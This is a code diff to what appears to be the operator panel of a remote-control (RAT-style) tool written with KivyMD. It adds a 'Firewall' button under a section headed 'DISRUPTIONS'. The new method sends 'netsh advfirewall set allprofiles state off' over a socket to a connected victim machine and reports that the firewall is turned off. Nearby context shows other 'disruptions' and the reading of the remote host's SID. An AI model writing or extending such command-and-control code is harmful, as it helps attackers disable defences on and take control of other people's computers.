@@ -78,6 +78,13 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.FileCreate()
+            MDRectangleFlatButton:
+                id: firewallBtn
+                text: "Firewall"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.Firewall()
 '''
 
 
@@ -185,7 +192,22 @@ class Main(MDApp):
             print(f"{output[0]}\n{output[1]}\n{output[8]}")
             print(f"SID\t\t\t\t\t\t\t{output2[2]}")
             break
-
+###############################DISRUPTIONS############################################
+    def Firewall(self):
+        while True:
+            command = "netsh advfirewall set allprofiles state off"
+            command = command.encode()
+            client.send(command)
+            print('[+] Command sent')
+            output = client.recv(1024)
+            output = output.decode()
+            print(f"Output: {output}")
+            msgoutput.config(state="normal")
+            msgoutput.delete("1.0", tk.END)
+            msgoutput.insert(tk.END, "Firewall turned off")
+            msgoutput.config(state="disabled")
+            break
+        
     # File creation disruption
     def FileCreate(self):
         while True:
